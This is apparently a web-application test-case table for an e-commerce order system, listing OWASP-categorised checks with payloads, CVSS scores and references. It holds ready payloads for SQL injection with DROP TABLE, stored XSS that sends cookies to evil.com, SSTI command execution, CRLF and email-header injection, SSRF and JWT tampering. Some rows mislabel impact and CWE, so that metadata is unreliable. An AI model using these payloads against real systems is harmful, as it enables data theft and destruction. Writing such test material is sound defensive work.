| ORD-094 | SQL Injection in Delivery Address Fields | Injection (WSTG-INPV-05) | Delivery Scheduling | 1. Enter delivery scheduling information. 2. Inject SQL payloads in address or time slot fields. 3. Submit and observe response. | Application must use parameterized queries for all delivery scheduling database operations. | <code>delivery_address=123 Main St' OR 1=1--; time_slot=morning'; DROP TABLE deliveries;--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-095 | Race Condition on Limited Delivery Slots | Business Logic (WSTG-BUSL-08) | Delivery Scheduling | 1. Identify a delivery time slot with limited availability. 2. Send multiple concurrent scheduling requests for the same slot. 3. Check if overbooking occurs. | Application must implement proper concurrency control to prevent overbooking of delivery time slots. | <code>Send 50 concurrent POST /api/delivery/schedule requests for the same time_slot_id</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Turbo Intruder;Burp Suite | CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ORD-096 | Unauthorized Delivery Schedule Cancellation | Broken Access Control (WSTG-AUTHZ-02) | Delivery Scheduling | 1. As User A attempt to cancel User B's scheduled delivery. 2. Use User B's delivery_schedule_id with User A's auth. 3. Check if cancellation succeeds. | Application must enforce ownership checks before allowing cancellation of scheduled deliveries. | <code>DELETE /api/delivery/schedule/DS-1002 with User A's authentication</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-097 | Delivery Date Manipulation for Free Shipping | Business Logic (WSTG-BUSL-01) | Delivery Scheduling | 1. Schedule delivery and check if specific dates have free shipping. 2. Intercept request and modify date to free shipping eligible date. 3. Check if discount applies. | Application must validate delivery date eligibility for promotions server-side and not trust client-provided dates. | <code>Change delivery_date to a promotional date; modify shipping_cost=0.00</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-098 | XSS in Delivery Instructions | Cross-Site Scripting (WSTG-INPV-02) | Delivery Scheduling | 1. Enter delivery scheduling with XSS payload in delivery instructions. 2. Submit the schedule. 3. Check if payload executes when driver or admin views instructions. | Application must sanitize all delivery instruction inputs and encode output to prevent stored XSS. | <code>delivery_instructions=&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-099 | Stored XSS in Order Notes | Cross-Site Scripting (WSTG-INPV-02) | Order Notes / Instructions | 1. Place an order with XSS payload in order notes or special instructions. 2. View the order in admin panel or customer order details. 3. Check if script executes. | Application must sanitize and encode all order notes content before rendering in any context. | <code>order_notes=&lt;svg/onload=alert('XSS')&gt; or special_instructions=&lt;img src=x onerror=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-100 | SQL Injection in Order Notes | Injection (WSTG-INPV-05) | Order Notes / Instructions | 1. Place an order and inject SQL payloads in the order notes field. 2. Submit and observe the response for SQL errors or data leakage. | Application must use parameterized queries for storing and retrieving order notes. | <code>order_notes=Please deliver fast' UNION SELECT password FROM users WHERE '1'='1</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-101 | IDOR on Order Notes Access | Broken Access Control (WSTG-AUTHZ-04) | Order Notes / Instructions | 1. Access order notes for own order. 2. Change order_id parameter to another user's order. 3. Check if other user's notes are accessible. | Application must verify order ownership before displaying order notes. | <code>GET /api/orders/1002/notes using User A's session</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-102 | SSTI in Order Notes Rendering | Injection (WSTG-INPV-18) | Order Notes / Instructions | 1. Add SSTI payloads in order notes field. 2. Submit the order. 3. Check if the template engine evaluates the expression when notes are rendered. | Application must treat order notes as plain text and not process template syntax within them. | <code>order_notes={{config}} or order_notes=${T(java.lang.Runtime).getRuntime().exec('id')}</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| ORD-103 | Excessive Data in Order Notes for DoS | Business Logic (WSTG-BUSL-05) | Order Notes / Instructions | 1. Submit order notes with an extremely large text payload. 2. Check if the server accepts it without length validation. 3. Observe impact on performance. | Application must enforce reasonable length limits on order notes to prevent storage and processing abuse. | <code>order_notes=[1MB+ of text data] or order_notes=A&#42;1000000</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger |
| ORD-104 | HTML Injection in Order Notes | Injection (WSTG-INPV-03) | Order Notes / Instructions | 1. Add HTML tags in order notes to modify page layout. 2. Submit and view the notes in different contexts. 3. Check for content injection. | Application must sanitize HTML in order notes and render only plain text. | <code>order_notes=&lt;h1&gt;URGENT: Order Cancelled&lt;/h1&gt;&lt;a href='https://evil.com'&gt;Click here for refund&lt;/a&gt;</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-105 | CRLF Injection in Order Notes | Injection (WSTG-INPV-15) | Order Notes / Instructions | 1. Inject CRLF characters in order notes. 2. Check if headers are injected when notes are included in responses or emails. | Application must strip or encode CRLF characters in all order note inputs. | <code>order_notes=Note%0d%0aSet-Cookie:session=evil or order_notes=test%0d%0aX-Injected:true</code> | CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger |
| ORD-106 | Price Manipulation on Gift Wrapping | Business Logic (WSTG-BUSL-01) | Gift Wrapping Options | 1. Select gift wrapping option during order. 2. Intercept the request and modify gift_wrap_price to 0 or negative. 3. Submit and check if free or credited gift wrapping is applied. | Application must use server-defined prices for gift wrapping and not accept client-provided pricing. | <code>Change gift_wrap_price=5.99 to gift_wrap_price=0.00 or gift_wrap_price=-5.99</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-107 | XSS in Gift Message | Cross-Site Scripting (WSTG-INPV-02) | Gift Wrapping Options | 1. Select gift wrapping and add a gift message. 2. Insert XSS payload in the gift_message field. 3. Check if it executes when the recipient or admin views the message. | Application must sanitize and encode gift messages before rendering to any user. | <code>gift_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt; or gift_message=&lt;img/src=x onerror=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-108 | Gift Wrapping Without Paying | Business Logic (WSTG-BUSL-01) | Gift Wrapping Options | 1. Add gift wrapping to order. 2. Intercept the final order request. 3. Remove the gift wrapping cost from the total but keep the gift_wrap=true flag. 4. Check if wrapping is applied without charge. | Application must recalculate total server-side including gift wrapping cost when the option is selected. | <code>Set gift_wrap=true but remove gift_wrap_cost from total calculation in request</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-109 | SQL Injection in Gift Message | Injection (WSTG-INPV-05) | Gift Wrapping Options | 1. Add gift wrapping with a gift message. 2. Inject SQL payload in the gift_message field. 3. Submit and observe the response. | Application must use parameterized queries for storing gift messages. | <code>gift_message=Happy Birthday' OR 1=1; DROP TABLE orders;--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-110 | IDOR on Gift Wrapping Configuration | Broken Access Control (WSTG-AUTHZ-04) | Gift Wrapping Options | 1. Apply gift wrapping to own order. 2. Change order_id to another user's order. 3. Check if gift wrapping is applied to another user's order. | Application must verify order ownership before allowing gift wrapping modifications. | <code>PUT /api/orders/1002/gift-wrap with User A's session</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-111 | Bypassing Gift Wrapping Availability Rules | Business Logic (WSTG-BUSL-02) | Gift Wrapping Options | 1. Check if certain items are not eligible for gift wrapping. 2. Force gift_wrap=true for ineligible items via API. 3. Check if it is accepted. | Application must validate gift wrapping eligibility server-side based on item type and rules. | <code>POST /api/orders with gift_wrap=true for item marked as non-wrappable</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-112 | IDOR Accessing Other Vendor's Order Details | Broken Access Control (WSTG-AUTHZ-04) | Multi-Vendor Orders | 1. Login as Vendor A. 2. Access order details for an order assigned to Vendor B by changing vendor_id or order_id. 3. Check if Vendor B's order details are visible. | Application must isolate vendor access to only their own orders within multi-vendor architecture. | <code>Change GET /api/vendor/orders?vendor_id=V001 to vendor_id=V002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-113 | Vendor Impersonation on Order Fulfillment | Broken Access Control (WSTG-AUTHZ-02) | Multi-Vendor Orders | 1. As Vendor A attempt to mark Vendor B's order items as shipped or fulfilled. 2. Intercept and modify vendor_id or item_id. 3. Check if the action succeeds. | Application must verify that the vendor owns the order items before allowing fulfillment actions. | <code>POST /api/vendor/orders/fulfill with Vendor B's order_item_id using Vendor A's credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-114 | Cross-Vendor Data Leakage in API Response | Information Disclosure (WSTG-INFO-05) | Multi-Vendor Orders | 1. As a vendor fetch order details via API. 2. Inspect the response for data belonging to other vendors on the same order. 3. Check for customer data shared across vendors. | API must only return vendor-specific data for multi-vendor orders and not expose other vendors' information. | <code>Inspect response for other_vendor_name; other_vendor_commission; cross_vendor_customer_data</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-115 | Commission Manipulation by Vendor | Business Logic (WSTG-BUSL-01) | Multi-Vendor Orders | 1. As a vendor intercept order-related requests. 2. Attempt to modify commission_rate or payout_amount parameters. 3. Check if manipulated commission is applied. | Application must calculate commissions server-side based on predefined rules and not accept vendor-provided commission values. | <code>Change commission_rate=15 to commission_rate=1 or payout_amount=100 to payout_amount=999</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-116 | Vendor A Cancelling Vendor B's Order Items | Broken Access Control (WSTG-AUTHZ-02) | Multi-Vendor Orders | 1. As Vendor A attempt to cancel order items belonging to Vendor B. 2. Modify the item_id or sub_order_id in the cancellation request. 3. Check if it processes. | Application must restrict cancellation capabilities to only the vendor's own order items. | <code>POST /api/vendor/orders/cancel-item with Vendor B's item_id using Vendor A's session</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-117 | Vendor Accessing Customer PII Across Orders | Information Disclosure (WSTG-INFO-05) | Multi-Vendor Orders | 1. As a vendor access customer details. 2. Check if vendor can see customer information from orders placed with other vendors. 3. Review API responses for excessive data. | Application must limit vendor access to customer information only relevant to their own fulfilled orders. | <code>GET /api/vendor/customers/C001 to check if full order history across all vendors is returned</code> | Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR |
| ORD-118 | Split Order Price Manipulation | Business Logic (WSTG-BUSL-01) | Multi-Vendor Orders | 1. Place a multi-vendor order. 2. Intercept the request and modify individual vendor prices or subtotals. 3. Check if total calculation is affected. | Application must calculate all split order prices and totals server-side ignoring client-provided vendor-level pricing. | <code>Modify vendor_subtotal for one vendor while keeping total unchanged</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-119 | SQL Injection in Vendor Order Filters | Injection (WSTG-INPV-05) | Multi-Vendor Orders | 1. As a vendor use order search or filter functionality. 2. Inject SQL payloads in filter parameters. 3. Observe response for data leakage. | Application must use parameterized queries for all vendor order search and filter operations. | <code>GET /api/vendor/orders?status=' UNION SELECT &#42; FROM vendors-- or search=1' OR '1'='1</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-120 | IDOR on Partial Shipment Status | Broken Access Control (WSTG-AUTHZ-04) | Partial Shipment | 1. View partial shipment details for own order. 2. Change order_id or shipment_id to another user's. 3. Check if other user's shipment details are accessible. | Application must verify order ownership before displaying partial shipment information. | <code>Change GET /api/shipments/SHIP-1001 to SHIP-1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-121 | Unauthorized Partial Shipment Creation | Broken Access Control (WSTG-AUTHZ-02) | Partial Shipment | 1. As a regular user attempt to create a partial shipment via API. 2. Try to mark specific items as shipped. 3. Check if the operation is restricted to authorized roles. | Application must restrict shipment creation and status updates to authorized personnel only. | <code>POST /api/orders/1001/shipments with regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-122 | Marking Items Shipped Without Actual Shipment | Business Logic (WSTG-BUSL-02) | Partial Shipment | 1. As an authorized user mark items as shipped via API. 2. Check if tracking numbers or shipment validation is required. 3. Attempt to skip tracking number. | Application must require valid tracking information before marking items as shipped in partial shipments. | <code>POST /api/shipments/create with tracking_number=null or empty tracking_number</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-123 | Duplicate Partial Shipment for Same Items | Business Logic (WSTG-BUSL-02) | Partial Shipment | 1. Create a partial shipment for specific items. 2. Attempt to create another partial shipment for the same items. 3. Check if duplicate shipments are allowed. | Application must track shipment status per item and prevent duplicate shipping of already-shipped items. | <code>POST /api/shipments/create for item_ids already in status=shipped</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-124 | Partial Shipment Quantity Manipulation | Business Logic (WSTG-BUSL-01) | Partial Shipment | 1. Create a partial shipment and intercept request. 2. Modify shipped_quantity to exceed ordered_quantity. 3. Check if over-shipping is possible. | Application must validate that shipped quantity does not exceed ordered quantity for each item. | <code>Change shipped_quantity=1 to shipped_quantity=100 for item ordered_quantity=1</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-125 | Refund Manipulation on Partial Shipment | Business Logic (WSTG-BUSL-01) | Partial Shipment | 1. Request refund for unshipped items in a partially shipped order. 2. Modify refund amount to include shipped items. 3. Check if excess refund is processed. | Application must calculate refunds only for eligible unshipped items and verify amounts server-side. | <code>Modify refund to include shipped items totaling more than unshipped items' value</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-126 | Race Condition Between Partial Shipments | Business Logic (WSTG-BUSL-08) | Partial Shipment | 1. Send multiple concurrent partial shipment requests for the same order. 2. Check if race condition allows over-shipping or duplicate tracking. | Application must use proper locking to prevent concurrent partial shipment conflicts. | <code>Send concurrent POST /api/shipments/create for same order with overlapping items</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Turbo Intruder;Burp Suite | CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ORD-127 | XSS in Shipment Notes or Tracking Updates | Cross-Site Scripting (WSTG-INPV-02) | Partial Shipment | 1. Add shipment notes or tracking status updates with XSS payload. 2. View the shipment details page. 3. Check if payload executes. | Application must sanitize all shipment-related text fields to prevent stored XSS. | <code>shipment_notes=&lt;script&gt;alert('XSS')&lt;/script&gt; or tracking_update=&lt;svg/onload=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-128 | Email Injection in Notification Settings | Injection (WSTG-INPV-11) | Order Status Notifications | 1. Update notification email address. 2. Inject additional email headers or recipients. 3. Check if notification emails are sent to injected addresses. | Application must sanitize email addresses and prevent header injection in notification systems. | <code>notification_email=user@test.com%0ACc:attacker@evil.com%0ABcc:spy@evil.com</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-129 | IDOR on Notification Preferences | Broken Access Control (WSTG-AUTHZ-04) | Order Status Notifications | 1. Update notification preferences for own account. 2. Change user_id to another user's. 3. Check if notification settings for another user are modified. | Application must verify that notification preference changes are only applied to the authenticated user's account. | <code>Change PUT /api/notifications/preferences with user_id=1001 to user_id=1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-130 | Notification Spoofing via API | Business Logic (WSTG-BUSL-02) | Order Status Notifications | 1. Attempt to trigger fake order status notifications via API. 2. Send crafted requests to notification endpoints with false status updates. 3. Check if notifications are sent. | Application must validate notification triggers against actual order state changes and not allow direct notification sending. | <code>POST /api/notifications/send with order_id=1001 and status=delivered (when not delivered)</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-131 | XSS in Push Notification Content | Cross-Site Scripting (WSTG-INPV-02) | Order Status Notifications | 1. If notification content is derived from order data inject XSS in order fields. 2. Trigger notification. 3. Check if payload executes in notification display. | Application must sanitize all dynamic content in notifications before rendering in any client context. | <code>Order field with &lt;img src=x onerror=alert(1)&gt; that appears in notification body</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-132 | SMS Injection in Phone Notification | Injection (WSTG-INPV-01) | Order Status Notifications | 1. Update notification phone number. 2. Inject SMS-specific payloads or multiple numbers. 3. Check if SMS is sent to unintended recipients. | Application must validate phone numbers strictly and prevent injection of additional recipients. | <code>notification_phone=+1234567890;+0987654321 or notification_phone=+1234567890%0a%0dSend money</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-133 | Notification Flooding / DoS | Business Logic (WSTG-BUSL-05) | Order Status Notifications | 1. Trigger rapid state changes on an order to generate excessive notifications. 2. Check if rate limiting exists on notifications. 3. Attempt to flood user with notifications. | Application must implement rate limiting on notifications and prevent notification flooding through rapid state changes. | <code>Rapidly toggle order status to trigger 100+ notifications per minute</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| ORD-134 | Unsubscribe Link Manipulation | Broken Access Control (WSTG-AUTHZ-04) | Order Status Notifications | 1. Use the unsubscribe link from a notification email. 2. Modify the user identifier in the unsubscribe URL. 3. Check if other users are unsubscribed. | Application must use signed or tokenized unsubscribe links that cannot be manipulated to affect other users. | <code>Change /unsubscribe?user=1001&amp;token=abc to user=1002&amp;token=abc</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-135 | Webhook Endpoint SSRF | SSRF (WSTG-INPV-19) | Order Status Notifications | 1. If webhook URLs can be configured for order status notifications set URL to internal endpoint. 2. Check if internal service is accessed. | Application must validate webhook URLs against an allowlist and block requests to internal networks. | <code>webhook_url=http://127.0.0.1:3306/ or http://internal-service.local/admin</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ORD-136 | Sensitive Data in Notification Content | Information Disclosure (WSTG-INFO-05) | Order Status Notifications | 1. Review notification content (email/SMS/push) for sensitive data exposure. 2. Check if full order details or payment information is included in notifications. | Notifications must contain minimal information and not expose sensitive data like full payment details or addresses. | <code>Review notification for full_address; card_number; order_total; item_details exposure</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Manual Review;Email Client | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-137 | Notification Channel Downgrade Attack | Business Logic (WSTG-BUSL-02) | Order Status Notifications | 1. If user has secure notification channel (in-app) attempt to change to insecure (SMS/email) via parameter tampering. 2. Check if downgrade is allowed without verification. | Application must verify user identity before allowing notification channel changes and warn about security implications. | <code>Change notification_channel=in_app to notification_channel=sms without re-authentication</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-138 | Broken Object Level Authorization on Batch Orders | Broken Access Control (WSTG-AUTHZ-04) | Place Order | 1. Submit a batch order containing multiple order items. 2. Include item IDs belonging to other users' wishlists or saved carts. 3. Check if those items are processed. | Application must validate ownership of all referenced objects in batch operations. | <code>POST /api/orders/batch with items array containing other users' saved_cart_item IDs</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-139 | JWT Token Manipulation on Order Endpoint | Authentication (WSTG-ATHN-01) | Place Order | 1. Decode the JWT token used for order placement. 2. Modify the user_id or role claim. 3. Re-encode and submit the request with the tampered token. | Application must validate JWT signatures server-side and reject tokens with modified claims. | <code>Modify JWT payload user_id=1001 to user_id=1002 or role=user to role=admin</code> | JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;jwt_tool | CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT |
